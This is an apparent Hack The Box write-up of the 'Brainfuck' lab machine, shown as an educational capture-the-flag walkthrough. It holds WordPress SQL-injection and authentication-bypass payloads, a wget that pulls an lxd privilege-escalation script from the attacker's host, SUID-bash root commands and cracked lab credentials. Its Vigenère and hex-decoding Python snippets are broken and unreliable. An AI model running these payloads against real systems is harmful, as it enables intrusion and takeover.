---
layout: post
title: "HTB - Brainfuck"
categories: htb
tags: ssh smtp pop3 imap https wordpress vigenere_cipher lxd RSA
---

## Enumeration and penetration
**nmap**
`nmap -p- --open -T5 -v -n 10.10.10.17 -oG allPorts`
`sudo nmap -sS --min-rate 5000 -p- --open -Pn -vvv 10.10.10.17 -oG allPorts`
```text
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
25/tcp  open  smtp    syn-ack ttl 63
110/tcp open  pop3    syn-ack ttl 63
143/tcp open  imap    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

```text
nmap -sC -sV -p22,25,110,143,443 10.10.10.17 -oN targeted 
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER CAPA UIDL AUTH-RESP-CODE RESP-CODES TOP PIPELINING
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: Pre-login more LITERAL+ have capabilities post-login IDLE ENABLE ID listed AUTH=PLAINA0001 LOGIN-REFERRALS OK IMAP4rev1 SASL-IR
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_http-title: Welcome to nginx!
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.10.0 (Ubuntu)
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Let's add the domain name to /etc/hosts for applying virtual hosting



#### 22/ssh

#### 25/smtp

#### 110/pop3

#### 134/ imap

#### 443/https
From nmap we have the next subdomains discovered
```
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_http-title: Welcome to nginx!
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.10.0 (Ubuntu)
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
But if we want discover deeper user openssl
`openssl s_client -connect 10.10.10.17:443`

Just inspect the HTTP service using the IP and the different domain names discovered
with https://brainfuck.htb/ we have a Wordpress 
###### Wordpress
`whatweb https://brainfuck.htb`
**Enum users**
https://brainfuck.htb/wp-login
An in the login panel just try with different users to check if the error message are differents
>admin
>orestis (This user is discovered inspecting openssl and nmap information)


Just inspect the web pages and yo can discover that:
1. orestis@brainfuck.htb exists
2. admin is a user
3. Exists a tool for tickets

```text
searchsploit wordpress ticket 
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Event Tickets 4.10.7.1 - CSV Injection                                                 | php/webapps/47335.txt
WordPress Plugin SupportEzzy Ticket System 1.2.5 - Persistent Cross-Site Scripting                      | php/webapps/35218.txt
WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities                | php/webapps/34589.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation                  | php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                         | php/webapps/40939.txt
```

How discover the plugins in wordpress?
For losers:
`wpscan --url "https://brainfuck.htb"` -> Problems with the certificate, just ignore it with
`wpscan --url "https://brainfuck.htb" --disable-tls-checks`
```text
[+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/


[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Atom Generator (Aggressive Detection)
 |  - https://brainfuck.htb/?feed=atom, <generator uri="https://wordpress.org/" version="4.7.3">WordPress</generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-admin/load-styles.php, Match: '4.7.3'



```

But the most ninja way to discover plugins in wordpress is:
1. Use seclist wordlist https://github.com/danielmiessler/SecLists
2. `find \name \*wordpress\*` -> /usr/share/seclist/Discovery/Web-Content/CMS
3. `ls | grep plugin` -> wp-plugins.fuzz.txt 
But if you want to have the full list of plugins ever you can see in https://github.com/wp-plugins and create your own dictionary
To create a custom dictionary just you can use the repositories urls based in pages to list https://github.com/orgs/wp-plugins/repositories?page=1 or apply a search (with the ticket word for example) and do the same thing https://github.com/orgs/wp-plugins/repositories?language=&page=2&q=ticket&sort=&type=
Lets create our own dictionary using this deature:
```
curl -s -X GET "https://github.com/orgs/wp-plugins/repositories?language=&page=1&q=ticket&sort=&type=" | html2text | grep -oP "\*\*\*\* .*? \*\*\*\*" | tr -d '*' | tr -d "Public" | awk 'NR>2'
```
Apply this to each page and you have a quite good resource you can just create sequence:
```
for i in $(seq 1 6) do curl -s -X GET "https://github.com/orgs/wp-plugins/repositories?language=&page=$i$&q=ticket&sort=&type=" | html2text | grep -oP "\*\*\*\* .*? \*\*\*\*" | tr -d '*' | tr -d "Public" | awk 'NR>2'; done
```

4. Fuzz with the list of plugins using wfuzz or the one you want
```
wfuzz -hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt https://brainfuck.htb/wp-content/plugins/FUZZ
```
You can just try to discover the plugins manually going to the path
`/wp-content/plugins`
![[Pasted image 20211107112822.png]]

Then we can just create our worslist or use in this case de Directory Listing to discover that the plugin _wp_support_plus_responsive_ is installed

Now just try to search with searchsploit
`searchsploit wordpress ticket plus`
![[Pasted image 20211107141446.png]]

Let's inspect the SQLi
`searchsploit -x 40939`
```text
<form action="http://brainfuck.htb/wp-admin/admin-ajax.php" method="post">
<input type="text" name="action" value="wpsp_getCatName">
<input type="text" name="cat_id" value="0 UNION SELECT 1,CONCAT(name,CHAR(58),slug),3 FROM wp_terms WHERE term_id=1">
<input type="submit" name="">
</form>
```
```
cd /var/www/html
nano index.html
	<form action="http://brainfuck.htb/wp-admin/admin-ajax.php" method="post">
	<input type="text" name="action" value="wpsp_getCatName">
	<input type="text" name="cat_id" value="0 UNION SELECT 1,CONCAT(name,CHAR(58),slug),3 FROM wp_terms WHERE term_id=1">
	<input type="submit" name="">
	</form>


```
You can check that `https://brainfuck.htb/wp-admin/admin-ajax.php` exists
And now run a http service and just execute the POST

This is not working, try another exploit there.
`searchsploit -x 41006`
Same idea
```
cd /var/www/html
nano index.html
	m method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="admin">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
	</form>

```
`systemctl apache start`
![[Pasted image 20211107143412.png]]

And with patience and testing you shoudl be able to bypass credentials!
![[Pasted image 20211107143511.png]]

Let's get a shell using wordpress:
![[Pasted image 20211107143900.png]]
Editor, modify 404 not foudn template to return a reverse shell
![[Pasted image 20211107144039.png]]
 At this point I discovered that we can't overwrite files :(
 ![[Pasted image 20211107144437.png]]
 
 Let's go to the plugins then...
 ![[Pasted image 20211107144651.png]]
 In the plugin related with SMTP we find credentials
 ![[Pasted image 20211107144800.png]]
 orestis:kHGuERB29DNiNE
 
 And we can use to identify to the SMTP service
 
 With this credentials we could test if it's working for ssh but not the case.
 ```
 nc brainfuck.htb 110
+OK Dovecot ready.
USER orestis
+OK
PASS kHGuERB29DNiNE
+OK Logged in.
 ```
 We are inside a e-mail tray, to move using the console for pop3:
 ```
 LIST
 RETR 1
 RETR 2
 	RETR 2
+OK 514 octets
Return-Path: <root@brainfuck.htb>
X-Original-To: orestis
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 0)
        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: Forum Access Details
Message-Id: <20170429101206.4227420AEB@brainfuck>
Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
From: root@brainfuck.htb (root)

Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
 ```
 orestis: kIEnnfEKJ#9UmdO
 
Okey this make me remember about the virtualhosting to s3cr3t...
![[Pasted image 20211107145555.png]]

And if you login in with the credentials:
![[Pasted image 20211107154836.png]]
You can see a coded message
To descifer use quip quip https://quipqiup.com/
but won't works

It is more complex than Cesar cipher as vigenere
If we have a encrypt message and the clear text we can discover the key and seeing that the user osiris use always the same message to finish his intervention we can use that in som cinegere decrypter. Remember delete each space and special characters
![[Pasted image 20211107155822.png]]
The is 'BrainfuCkmybrainfuckmybrainfu'
```python
plaintext = "OrestisHackingforfunandprofit"
ciphertext = "PieagnmJkoijegnbwzwxmlegrwsnn"
key = ""

for i in range (len(plaintext)):
	print((ord(ciphertext[i]) - ord(plaintext[i])) % 26) + 97
	add_char = chr(key_char)
	key += add_char
```

![[Pasted image 20211107160552.png]]
![[Pasted image 20211107160623.png]]

```
wget https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --no-check-certificate
```
This way we download the certificate to access through ssh, you can check this openning or trying to authenticate using:
`ssh -i id_rsa orestis@10.10.10.17`

 This certificate is protected by a password, could we try break it using brute force?
 ```
 locate ssh2john
 ssh2john id_rsa > ssh_john -> Return a hash to be break with john
 
 john --wordlist=/usr/share/wordlists/rockyou.txt ssh_john
 	3poulakia!

 ```
 ssh_password-> 3poulakia!
 
 Okey we have already ssh access to the machine.
 
 ## Privileges escalation
 #### First way - lxd
 https://www.youtube.com/watch?v=NtJ2TakoLLQ&t=3118s
```
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
```
The user is in the group 'lxd'
`searchsploit lxd`
`searchsploit -m 46978.sh`
`mv 46978.sh ldx_exploit.sh`
`dos2unix ldx_exploit.sh`
And following the isntructions there
Download in your machine an alpine image
```
#atacker
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
chmod +x build-alpine

./build-alpine

#And now you have a tar.gz with the alpine image,
#send this to the victim machine
python3 -m http.server

#In the victim
wget kali_ip:8000/alpine-v3.14-x86_64-20211107_1030.tar.gz
wget kali_ip:8000/ldx_exploit.sh

```
You can execute the script in the victim machine giving -f and the tar.gz file or just execute:
```
  lxc image import $filename --alias alpine && lxd init --auto
  echo -e "[*] Listing images...\n" && lxc image list
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc sh
```
![[Pasted image 20211107164731.png]]
This way we are in a container but with all the filesystem of the original system mounted in /mnt/root.

You can access using the container or give SUID to the bash executable
`chmod 4755 /bin/bash`
Go out from the container and execute the shell using SUID
`bash -p`
And already we are root.

#### Second way
Using the files in the User folder
`cat encrypt.sage` -> Encrypt root.txt with rsa using p and q
```
cat debug.txt 
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307

7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079

30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997

```
Let's suppose that ar p, q and e, using the next page we can decrypt

And in the output is the cipher message
```
orestis@brainfuck:~$ cat output.txt 
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

https://www.cryptool.org/en/cto/rsa-step-by-step

![[Pasted image 20211107170057.png]]
`24604052029401386049980296953784287079059245867880966944246662849341507003750`
Convert to hexadecimal
```
python3
>>> hex(24604052029401386049980296953784287079059245867880966944246662849341507003750)[2:-1].decode("hex")
```
And we should have the root.txt value!.

